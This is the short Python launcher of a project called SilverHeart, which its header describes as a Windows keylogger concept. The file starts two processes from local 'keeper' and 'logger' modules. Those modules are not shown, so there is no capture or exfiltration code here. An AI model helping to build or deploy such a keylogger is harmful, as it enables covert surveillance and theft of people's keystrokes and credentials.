""" A software fully developed in Python 3.7, SilverHeart is a keylogger concept, that can be deployed in Windows. (Mac OS and Linux distributions support will be added soon).
    Copyright (C) 2020 Pedro Vieira

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>. 
"""

# ------------------------------------------------------------------------------------------
#   Fundamental Changes must me made for the proper function of this code
#   The code bellow is the legacy code for Windows with slight changes
# ------------------------------------------------------------------------------------------

import multiprocessing as mp

import keeper
import logger


if __name__ == '__main__':
    mp.freeze_support()
    p1 = mp.Process(target=keeper.keeper)
    p2 = mp.Process(target=logger.logger)
    p1.start()
    p2.start()
    p1.join()
    p2.join()
